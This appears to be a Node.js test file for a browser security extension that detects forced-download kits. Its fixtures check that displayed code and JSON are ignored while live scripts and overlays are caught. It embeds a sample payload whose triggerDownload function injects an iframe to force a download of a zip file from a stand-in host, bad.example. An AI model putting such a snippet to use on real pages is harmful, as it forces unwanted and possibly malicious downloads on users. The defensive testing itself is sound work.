"use strict";
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const assert = require("node:assert/strict");
const read = file => fs.readFileSync(path.join(__dirname, "..", file), "utf8");
const payload = `const html = '<div class="dlp-overlay">电脑版推荐</div>';
function triggerDownload() { const frame = document.createElement('iframe');
frame.src = 'https://bad.example/forced.zip'; document.body.appendChild(frame); }`;
function node(tag, text = "", attrs = {}, ancestor = "") {
  return { nodeType: 1, tagName: tag.toUpperCase(), textContent: text,
    className: attrs.class || "", id: attrs.id || "", style: {},
    getAttribute: name => attrs[name] || null,
    closest: selector => ancestor && selector.split(",").map(s => s.trim()).includes(ancestor) ? {} : null,
    querySelector: () => null, querySelectorAll: () => [], remove() {} };
}
function detect({ scripts = [], overlays = [], html = payload } = {}) {
  const signals = [], guards = [];
  const NS = { state: { protectedTargets: [] }, pageLooksLikeSearchEngineResultsPage: () => false,
    shouldNeverArmProtection: () => false, looksLikeMatureOfficialPortal: () => false,
    getHtmlSlice: () => html, PACKAGE_EXT: /\.(exe|zip)(?:\?|#|$)/i,
    isPackageFileUrl: u => /\.(exe|zip)(?:\?|#|$)/i.test(u), formatPackageLabel: u => u,
    addSignal: (...a) => signals.push(a), installDownloadGuard: (...a) => guards.push(a),
    postToHooks() {}, disableAllDownloadIntentControls() {} };
  const document = { querySelectorAll(selector) {
    if (selector === "script:not([src])") return scripts;
    if (selector.startsWith(".dlp-overlay")) return overlays;
    return [];
  } };
  vm.runInNewContext(read("extension/content/detectors-extended.js"), {
    window: { SilverfoxContent: NS }, document, location: new URL("https://github.com/owner/repo"), URL
  });
  return { hit: NS.detectDesktopForceDownloadKit(), signals, guards, state: NS.state };
}
// Identical source text in repository code/README/JSON must not count as running code.
for (const fixture of [ {}, { html: `<pre><code>${payload}</code></pre>` },
  { scripts: [node("script", JSON.stringify({ rawLines: payload }), { type: "application/json" })] },
  { scripts: [node("script", payload, { type: "application/ld+json" })] },
  { scripts: [node("script", payload, { type: "text/plain" })] },
  { scripts: [node("script", payload, {}, "template")] },
  { overlays: [node("div", "电脑版推荐", { class: "dlp-overlay" }, "code")] },
  { scripts: [node("script", `const selector='.dlp-overlay';`), node("script", `const text='电脑版推荐';`)] }
]) {
  const r = detect(fixture);
  assert.equal(r.hit, false); assert.equal(r.signals.length, 0); assert.equal(r.guards.length, 0);
}
for (const fixture of [ { scripts: [node("script", payload)] },
  { scripts: [node("script", payload, { type: "module" })] },
  { scripts: [node("script", payload, {}, "pre")] },
  { overlays: [node("div", "电脑版推荐", { class: "dlp-overlay" })] }
]) {
  const r = detect(fixture);
  assert.equal(r.hit, true); assert.equal(r.state._desktopForceDlKit, true);
  assert.equal(r.signals[0][1], 24); assert.equal(r.guards[0][1].lockHard, true);
}
assert.equal(detect({ scripts: [node("script", payload)] }).state.protectedTargets[0], "https://bad.example/forced.zip");
console.log("PASS: displayed source/JSON cannot arm content guard; executable scripts and actual overlays still do");

const hooks = { PackageHeuristics: { PACKAGE_EXT: /\.(zip|exe)(?:\?|#|$)/i,
  isPackageFileUrl: u => /\.(zip|exe)(?:\?|#|$)/i.test(u), isStrongProductInstallerUrl: () => false } };
const context = { window: { SilverfoxPageHooks: hooks }, document: {}, URL };
for (const file of ["cloaking-kit.js", "dom-guard.js"]) vm.runInNewContext(read(`extension/page-hooks/${file}`), context);
let armed = 0;
const policy = { isLightPage: () => false, officialSafe: false, guardEnabled: false, forceDesktopDlKit: false,
  armDesktopForceDownloadKit: () => { armed++; } };
for (const el of [node("script", payload, { type: "application/json" }),
  node("code", payload), node("pre", payload), node("div", "电脑版推荐", { class: "dlp-modal" }, "code"),
  node("a", "", { href: "https://github.com/owner/repo/archive/main.zip", style: "display:none" })]) {
  assert.equal(hooks.CloakingKit.isDesktopForceDownloadNode(el), false);
  assert.equal(hooks.DomGuard.shouldRejectInjectedNode(el, policy), false);
}
assert.equal(armed, 0);
for (const el of [node("script", payload), node("script", payload, {}, "pre"),
  node("div", "电脑版推荐", { class: "dlp-modal" }),
  node("iframe", "", { src: "https://bad.example/forced.zip", style: "display:none" })]) {
  assert.equal(hooks.CloakingKit.isDesktopForceDownloadNode(el), true);
  assert.equal(hooks.DomGuard.shouldRejectInjectedNode(el, policy), true);
}
assert.equal(armed, 4);
console.log("PASS: page hooks ignore code/JSON and hidden links; active kit injection remains blocked");
